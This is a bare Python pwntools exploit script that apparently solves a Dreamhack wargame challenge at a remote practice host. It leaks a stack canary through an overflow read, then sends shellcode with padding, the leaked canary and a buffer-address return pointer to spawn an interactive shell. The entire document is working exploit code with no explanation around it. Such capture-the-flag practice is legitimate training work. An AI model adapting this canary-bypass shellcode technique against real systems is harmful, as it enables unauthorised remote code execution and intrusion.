from pwn import *
from pwn import u64
from pwn import p64

p = remote("host3.dreamhack.games", 15002)

context.arch = "amd64"

p.recvuntil('buf: ')
buf = int(p.recv(14), 16)

payload = b'A'*0x59
p.sendafter(b'Input: ', payload)
p.recvuntil(payload)

canary = u64(b"\x00" + p.recv(7))

payload = asm(shellcraft.sh())
payload += b"A"*0x28
payload += p64(canary)
payload += b"A"*0x8
payload += p64(buf)

p.sendafter(b'Input: ', payload)


p.interactive()